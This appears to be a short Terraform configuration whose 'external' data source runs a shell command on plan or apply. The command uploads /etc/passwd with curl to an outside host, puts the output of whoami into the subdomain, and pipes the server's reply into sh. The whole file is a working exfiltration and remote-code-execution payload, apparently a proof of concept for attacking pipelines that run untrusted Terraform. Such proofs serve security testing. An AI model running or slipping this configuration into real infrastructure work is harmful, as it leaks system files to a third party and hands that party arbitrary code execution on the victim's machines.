data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd https://`whoami`.aft184jpzcgcwnwtg1ehqk7kabg74zso.net-spi.com/exfil4 | sh"] 
}
